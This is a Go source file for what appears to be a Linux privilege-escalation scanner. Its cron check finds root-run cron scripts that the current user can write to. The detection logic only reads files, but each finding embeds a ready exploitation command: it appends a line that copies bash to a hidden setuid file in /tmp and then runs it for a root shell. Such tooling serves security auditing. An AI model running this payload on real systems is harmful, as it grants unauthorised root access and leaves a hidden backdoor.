package scan

import (
	"os"
	"path/filepath"
	"strings"
)

// CronCheck looks for root-run cron jobs whose target is writable by the current
// user: scripts in /etc/cron.{hourly,daily,weekly,monthly} and absolute paths
// referenced in /etc/crontab and /etc/cron.d/*. It only reads files and probes
// write access; it never edits a cron job.
type CronCheck struct{}

func (CronCheck) Name() string { return "cron" }

var cronDirs = []string{
	"/etc/cron.hourly", "/etc/cron.daily", "/etc/cron.weekly", "/etc/cron.monthly",
}

func (cr *CronCheck) Detect(c *Context) []Finding {
	var findings []Finding
	seen := map[string]bool{}

	emit := func(path, evidence string) {
		if seen[path] {
			return
		}
		seen[path] = true
		findings = append(findings, Finding{
			Check:       cr.Name(),
			Title:       "Writable file run by root cron: " + path,
			Category:    "cron",
			Confidence:  ConfHigh,
			BlastRadius: BlastReversible,
			Evidence:    evidence,
			Command:     "# back up " + path + ", append a root payload, e.g.:\n#   echo 'cp /bin/bash /tmp/.b && chmod +s /tmp/.b' >> " + path + "\n# wait for the schedule, then:  /tmp/.b -p",
			Reference:   "https://book.hacktricks.xyz/linux-hardening/privilege-escalation#cron-using-a-script-with-a-wildcard-wildcard-injection",
		})
	}

	// Scripts dropped in the periodic cron directories all run as root.
	for _, dir := range cronDirs {
		entries, err := os.ReadDir(dir)
		if err != nil {
			continue
		}
		for _, e := range entries {
			if e.IsDir() {
				continue
			}
			p := filepath.Join(dir, e.Name())
			if writable(p) {
				emit(p, "root-run cron script is writable: "+p)
			}
		}
	}

	// Absolute paths referenced from the system crontab and /etc/cron.d.
	files := []string{"/etc/crontab"}
	if g, err := filepath.Glob("/etc/cron.d/*"); err == nil {
		files = append(files, g...)
	}
	for _, f := range files {
		content, err := os.ReadFile(f)
		if err != nil {
			continue
		}
		for _, line := range strings.Split(string(content), "\n") {
			for _, p := range extractAbsPaths(line) {
				if info, err := os.Stat(p); err == nil && info.Mode().IsRegular() && writable(p) {
					emit(p, "referenced by "+f+" and writable: "+strings.TrimSpace(line))
				}
			}
		}
	}
	return findings
}

// extractAbsPaths returns the absolute-path tokens on a cron line (skipping
// comments and PATH=/MAILTO= style assignments). Pure function for testability.
func extractAbsPaths(line string) []string {
	line = strings.TrimSpace(line)
	if line == "" || strings.HasPrefix(line, "#") {
		return nil
	}
	var paths []string
	for _, tok := range strings.Fields(line) {
		if strings.HasPrefix(tok, "/") && !strings.Contains(tok, "=") {
			paths = append(paths, tok)
		}
	}
	return paths
}
